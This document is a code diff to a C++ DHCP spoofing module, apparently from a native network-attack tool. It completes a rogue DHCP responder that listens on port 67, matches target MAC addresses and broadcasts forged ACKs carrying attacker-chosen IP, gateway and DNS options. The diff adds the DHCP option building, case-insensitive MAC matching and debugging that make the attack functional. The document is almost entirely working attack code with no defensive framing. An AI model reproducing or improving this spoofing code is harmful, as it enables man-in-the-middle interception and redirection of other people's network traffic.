@@ -54,7 +54,7 @@ std::string mac_to_string(const uint8_t *mac) {
     return std::string(mac_str);
 }
 
-// Function to convert string MAC to bytes
+// Function to convert string MAC to bytes (case-insensitive)
 bool string_to_mac(const std::string& mac_str, uint8_t *mac) {
     int values[6];
     char sep[5];
@@ -71,11 +71,27 @@ bool string_to_mac(const std::string& mac_str, uint8_t *mac) {
     return false;
 }
 
+// Case-insensitive MAC comparison
+bool mac_equals(const std::string& mac1, const std::string& mac2) {
+    if(mac1.length() != mac2.length()) return false;
+    for(size_t i = 0; i < mac1.length(); i++) {
+        if(tolower(mac1[i]) != tolower(mac2[i])) return false;
+    }
+    return true;
+}
+
 // Function to craft a DHCP offer/ACK packet
 int craft_dhcp_response(const struct dhcp_header *request, 
-                       struct dhcp_header *response, 
+                       unsigned char *response_buffer, 
+                       int buffer_size,
                        const DHCPSpoofRule& rule) {
+    if(buffer_size < (int)(sizeof(struct dhcp_header) + 100)) {
+        LOGE("Response buffer too small for DHCP packet");
+        return -1;
+    }
+    
     // Copy the request header to response
+    struct dhcp_header *response = (struct dhcp_header*)response_buffer;
     memcpy(response, request, sizeof(struct dhcp_header));
     
     // Set response fields
@@ -84,10 +100,71 @@ int craft_dhcp_response(const struct dhcp_header *request,
     response->siaddr = inet_addr(rule.gateway_ip.c_str());  // Server IP
     response->magic_cookie = htonl(0x63825363);  // DHCP magic cookie
     
-    LOGD("Crafted DHCP response for MAC %s -> IP %s", 
-         mac_to_string(request->chaddr).c_str(), rule.spoofed_ip.c_str());
+    LOGD("Crafted DHCP response for MAC %s -> IP %s (gateway: %s, subnet: %s, dns: %s)", 
+         mac_to_string(request->chaddr).c_str(), 
+         rule.spoofed_ip.c_str(),
+         rule.gateway_ip.c_str(),
+         rule.subnet_mask.c_str(),
+         rule.dns_server.c_str());
     
-    return sizeof(struct dhcp_header);
+    // Add DHCP options
+    unsigned char *options = response_buffer + sizeof(struct dhcp_header);
+    int options_len = 0;
+    
+    // Option 53: DHCP Message Type (5 = ACK)
+    options[options_len++] = 53;  // Option code
+    options[options_len++] = 1;   // Length
+    options[options_len++] = 5;   // ACK
+    LOGD("Added DHCP message type: ACK");
+    
+    // Option 54: DHCP Server Identifier (use gateway IP as server)
+    options[options_len++] = 54;  // Option code
+    options[options_len++] = 4;   // Length
+    uint32_t server_id = inet_addr(rule.gateway_ip.c_str());
+    memcpy(&options[options_len], &server_id, 4);
+    options_len += 4;
+    LOGD("Added DHCP server ID: %s", rule.gateway_ip.c_str());
+    
+    // Option 1: Subnet Mask
+    options[options_len++] = 1;  // Option code
+    options[options_len++] = 4;  // Length
+    uint32_t subnet = inet_addr(rule.subnet_mask.c_str());
+    memcpy(&options[options_len], &subnet, 4);
+    options_len += 4;
+    LOGD("Added subnet mask option: %s", rule.subnet_mask.c_str());
+    
+    // Option 3: Router (Gateway)
+    options[options_len++] = 3;  // Option code
+    options[options_len++] = 4;  // Length
+    uint32_t gateway = inet_addr(rule.gateway_ip.c_str());
+    memcpy(&options[options_len], &gateway, 4);
+    options_len += 4;
+    LOGD("Added router option: %s", rule.gateway_ip.c_str());
+    
+    // Option 6: DNS Server
+    options[options_len++] = 6;  // Option code
+    options[options_len++] = 4;  // Length
+    uint32_t dns = inet_addr(rule.dns_server.c_str());
+    memcpy(&options[options_len], &dns, 4);
+    options_len += 4;
+    LOGD("Added DNS server option: %s", rule.dns_server.c_str());
+    
+    // Option 51: Lease Time (1 hour = 3600 seconds)
+    options[options_len++] = 51;  // Option code
+    options[options_len++] = 4;   // Length
+    uint32_t lease_time = htonl(3600);
+    memcpy(&options[options_len], &lease_time, 4);
+    options_len += 4;
+    LOGD("Added lease time option: 3600 seconds");
+    
+    // Option 255: End of options
+    options[options_len++] = 255;
+    
+    int total_size = sizeof(struct dhcp_header) + options_len;
+    LOGD("DHCP response packet size: %d bytes (header: %zu, options: %d)", 
+         total_size, sizeof(struct dhcp_header), options_len);
+    
+    return total_size;
 }
 
 // Function to handle incoming DHCP packets
@@ -101,17 +178,18 @@ void handle_dhcp_packet(unsigned char *packet, int packet_size, struct sockaddr_
     
     // Check if this is a DHCP discover/request message
     if (header->op != 1) {  // Not a request
+        LOGD("Ignoring non-request DHCP packet (op=%d)", header->op);
         return;
     }
     
     // Check for DHCP magic cookie
     if (ntohl(header->magic_cookie) != 0x63825363) {
-        LOGE("Invalid DHCP magic cookie");
+        LOGE("Invalid DHCP magic cookie: 0x%x", ntohl(header->magic_cookie));
         return;
     }
     
     std::string client_mac = mac_to_string(header->chaddr);
-    LOGD("Received DHCP request from MAC: %s", client_mac.c_str());
+    LOGD("Received DHCP request from MAC: %s (xid: 0x%x)", client_mac.c_str(), ntohl(header->xid));
     
     // Check if this MAC matches any of our spoofing rules
     DHCPSpoofRule matched_rule;
@@ -119,10 +197,13 @@ void handle_dhcp_packet(unsigned char *packet, int packet_size, struct sockaddr_
     
     {
         std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
+        LOGD("Checking %zu DHCP rules for MAC %s", g_dhcp_rules.size(), client_mac.c_str());
         for(const auto& rule : g_dhcp_rules) {
-            if(rule.target_mac == client_mac) {
+            LOGD("  Rule: %s -> %s", rule.target_mac.c_str(), rule.spoofed_ip.c_str());
+            if(mac_equals(rule.target_mac, client_mac)) {
                 matched_rule = rule;
                 rule_found = true;
+                LOGD("  ✓ MATCHED!");
                 break;
             }
         }
@@ -133,8 +214,13 @@ void handle_dhcp_packet(unsigned char *packet, int packet_size, struct sockaddr_
              client_mac.c_str(), matched_rule.spoofed_ip.c_str());
         
         // Craft a DHCP response packet
-        struct dhcp_header response;
-        int response_size = craft_dhcp_response(header, &response, matched_rule);
+        unsigned char response_buffer[1500];
+        int response_size = craft_dhcp_response(header, response_buffer, sizeof(response_buffer), matched_rule);
+        
+        if(response_size <= 0) {
+            LOGE("Failed to craft DHCP response");
+            return;
+        }
         
         // Send the spoofed response back to the client
         int dhcp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -150,17 +236,20 @@ void handle_dhcp_packet(unsigned char *packet, int packet_size, struct sockaddr_
             response_addr.sin_port = htons(68);  // BOOTP client port
             response_addr.sin_addr.s_addr = INADDR_BROADCAST;  // Broadcast to all clients
             
-            ssize_t sent = sendto(dhcp_sock, &response, response_size, 0, 
+            LOGD("Sending DHCP response to broadcast (port 68)...");
+            ssize_t sent = sendto(dhcp_sock, response_buffer, response_size, 0, 
                                   (struct sockaddr*)&response_addr, sizeof(response_addr));
             
             if(sent > 0) {
-                LOGD("Sent spoofed DHCP response to %s (%d bytes)", 
-                     client_mac.c_str(), (int)sent);
+                LOGD("✓ Sent spoofed DHCP response to %s (%d bytes, xid: 0x%x)", 
+                     client_mac.c_str(), (int)sent, ntohl(header->xid));
             } else {
-                LOGE("Failed to send DHCP response: %s", strerror(errno));
+                LOGE("✗ Failed to send DHCP response: %s (errno: %d)", strerror(errno), errno);
             }
             
             close(dhcp_sock);
+        } else {
+            LOGE("Failed to create response socket: %s", strerror(errno));
         }
     } else {
         LOGD("No DHCP spoofing rule found for MAC: %s", client_mac.c_str());
@@ -174,14 +263,19 @@ void dhcp_spoof_thread_func(const std::string& interface) {
     // Create raw socket to capture DHCP packets (UDP port 67)
     g_dhcp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if(g_dhcp_socket < 0) {
-        LOGE("Failed to create DHCP spoofing socket: %s", strerror(errno));
+        LOGE("Failed to create DHCP spoofing socket: %s (errno: %d)", strerror(errno), errno);
         return;
     }
+    LOGD("Created DHCP socket: fd=%d", g_dhcp_socket);
     
     // Allow port reuse and broadcast
     int opt = 1;
-    setsockopt(g_dhcp_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-    setsockopt(g_dhcp_socket, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
+    if(setsockopt(g_dhcp_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+        LOGE("Failed to set SO_REUSEADDR: %s", strerror(errno));
+    }
+    if(setsockopt(g_dhcp_socket, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt)) < 0) {
+        LOGE("Failed to set SO_BROADCAST: %s", strerror(errno));
+    }
     
     // Bind to DHCP server port (67)
     struct sockaddr_in server_addr;
@@ -191,11 +285,12 @@ void dhcp_spoof_thread_func(const std::string& interface) {
     server_addr.sin_addr.s_addr = INADDR_ANY;  // Listen on all interfaces
     
     if(bind(g_dhcp_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-        LOGE("Failed to bind DHCP socket to port 67: %s", strerror(errno));
+        LOGE("Failed to bind DHCP socket to port 67: %s (errno: %d)", strerror(errno), errno);
         close(g_dhcp_socket);
         g_dhcp_socket = -1;
         return;
     }
+    LOGD("✓ Bound to port 67 successfully");
     
     g_stop_dhcp_spoofing = false;
     
@@ -203,6 +298,15 @@ void dhcp_spoof_thread_func(const std::string& interface) {
     unsigned char packet_buffer[1500];  // Standard Ethernet frame size
     
     LOGD("DHCP spoofing listening on port 67...");
+    
+    int packet_count = 0;
+    int no_packet_count = 0;
+    
+    // Set receive timeout to 5 seconds for periodic status logging
+    struct timeval tv;
+    tv.tv_sec = 5;
+    tv.tv_usec = 0;
+    setsockopt(g_dhcp_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     
     while(!g_stop_dhcp_spoofing) {
         struct sockaddr_in client_addr;
@@ -213,9 +317,22 @@ void dhcp_spoof_thread_func(const std::string& interface) {
         
         if(packet_size < 0) {
             if(errno == EINTR) continue;
-            LOGE("Error receiving DHCP packet: %s", strerror(errno));
+            if(errno == EAGAIN || errno == EWOULDBLOCK) {
+                // Timeout - log status periodically
+                no_packet_count++;
+                if(no_packet_count % 1 == 0) {  // Every 5 seconds
+                    LOGD("DHCP listening... (no packets in last 5s, total received: %d)", packet_count);
+                }
+                continue;
+            }
+            LOGE("Error receiving DHCP packet: %s (errno: %d)", strerror(errno), errno);
             break;
         }
+        
+        no_packet_count = 0;
+        packet_count++;
+        LOGD("✓ Received DHCP packet #%d from %s:%d (size: %d bytes)", 
+             packet_count, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), packet_size);
         
         // Handle the DHCP packet
         handle_dhcp_packet(packet_buffer, packet_size, &client_addr);
@@ -223,7 +340,7 @@ void dhcp_spoof_thread_func(const std::string& interface) {
     
     close(g_dhcp_socket);
     g_dhcp_socket = -1;
-    LOGD("DHCP spoofing thread stopped");
+    LOGD("DHCP spoofing thread stopped (processed %d packets total)", packet_count);
 }
 
 bool dhcp_spoof_init() {
@@ -232,7 +349,7 @@ bool dhcp_spoof_init() {
 }
 
 bool dhcp_start_spoofing(const char *interface, const std::vector<DHCPSpoofRule>& rules) {
-    LOGD("Starting DHCP spoofing on interface: %s", interface);
+    LOGD("Starting DHCP spoofing on interface: %s with %zu rules", interface, rules.size());
     
     if(g_dhcp_spoof_active.load()) {
         LOGE("DHCP spoofing is already active");
@@ -243,16 +360,22 @@ bool dhcp_start_spoofing(const char *interface, const std::vector<DHCPSpoofRule>
     {
         std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
         g_dhcp_rules = rules;
+        LOGD("Loaded %zu DHCP spoofing rules:", g_dhcp_rules.size());
+        for(const auto& rule : g_dhcp_rules) {
+            LOGD("  • %s -> %s (gw: %s, mask: %s, dns: %s)", 
+                 rule.target_mac.c_str(), rule.spoofed_ip.c_str(),
+                 rule.gateway_ip.c_str(), rule.subnet_mask.c_str(), rule.dns_server.c_str());
+        }
     }
     
     // Start the spoofing thread
     try {
         g_dhcp_spoof_thread = new std::thread(dhcp_spoof_thread_func, std::string(interface));
         g_dhcp_spoof_active = true;
-        LOGD("DHCP spoofing started successfully");
+        LOGD("✓ DHCP spoofing started successfully");
         return true;
     } catch(const std::exception& e) {
-        LOGE("Failed to start DHCP spoofing thread: %s", e.what());
+        LOGE("✗ Failed to start DHCP spoofing thread: %s", e.what());
         return false;
     }
 }
@@ -268,18 +391,21 @@ void dhcp_stop_spoofing() {
     g_stop_dhcp_spoofing = true;
     
     if(g_dhcp_socket >= 0) {
+        LOGD("Closing DHCP socket: fd=%d", g_dhcp_socket);
         close(g_dhcp_socket);
         g_dhcp_socket = -1;
     }
     
     if(g_dhcp_spoof_thread && g_dhcp_spoof_thread->joinable()) {
+        LOGD("Waiting for DHCP spoofing thread to join...");
         g_dhcp_spoof_thread->join();
         delete g_dhcp_spoof_thread;
         g_dhcp_spoof_thread = nullptr;
+        LOGD("DHCP spoofing thread joined");
     }
     
     g_dhcp_spoof_active = false;
-    LOGD("DHCP spoofing stopped");
+    LOGD("✓ DHCP spoofing stopped");
 }
 
 void dhcp_add_rule(const char *target_mac, const char *spoofed_ip, 
@@ -290,11 +416,12 @@ void dhcp_add_rule(const char *target_mac, const char *spoofed_ip,
         // Check if rule already exists
         for(auto& rule : g_dhcp_rules) {
             if(rule.target_mac == target_mac) {
+                LOGD("Updating DHCP rule for %s: %s -> %s (gw: %s, mask: %s, dns: %s)", 
+                     target_mac, rule.spoofed_ip.c_str(), spoofed_ip, gateway_ip, subnet_mask, dns_server);
                 rule.spoofed_ip = spoofed_ip;
                 rule.gateway_ip = gateway_ip;
                 rule.subnet_mask = subnet_mask;
                 rule.dns_server = dns_server;
-                LOGD("Updated DHCP spoofing rule for %s to %s", target_mac, spoofed_ip);
                 return;
             }
         }
@@ -302,13 +429,17 @@ void dhcp_add_rule(const char *target_mac, const char *spoofed_ip,
         g_dhcp_rules.push_back({
             target_mac, spoofed_ip, gateway_ip, subnet_mask, dns_server
         });
-        LOGD("Added DHCP spoofing rule: %s -> %s", target_mac, spoofed_ip);
+        LOGD("✓ Added DHCP rule: %s -> %s (gw: %s, mask: %s, dns: %s)", 
+             target_mac, spoofed_ip, gateway_ip, subnet_mask, dns_server);
+    } else {
+        LOGE("Invalid DHCP rule parameters (null values)");
     }
 }
 
 void dhcp_remove_rule(const char *target_mac) {
     if(target_mac) {
         std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
+        size_t before = g_dhcp_rules.size();
         g_dhcp_rules.erase(
             std::remove_if(g_dhcp_rules.begin(), g_dhcp_rules.end(),
                           [target_mac](const DHCPSpoofRule& rule) {
@@ -316,14 +447,19 @@ void dhcp_remove_rule(const char *target_mac) {
                           }),
             g_dhcp_rules.end()
         );
-        LOGD("Removed DHCP spoofing rule for %s", target_mac);
+        if(g_dhcp_rules.size() < before) {
+            LOGD("✓ Removed DHCP rule for %s (%zu rules remaining)", target_mac, g_dhcp_rules.size());
+        } else {
+            LOGD("No DHCP rule found for %s", target_mac);
+        }
     }
 }
 
 void dhcp_clear_rules() {
     std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
+    size_t count = g_dhcp_rules.size();
     g_dhcp_rules.clear();
-    LOGD("Cleared all DHCP spoofing rules");
+    LOGD("Cleared %zu DHCP spoofing rules", count);
 }
 
 bool dhcp_is_active() {
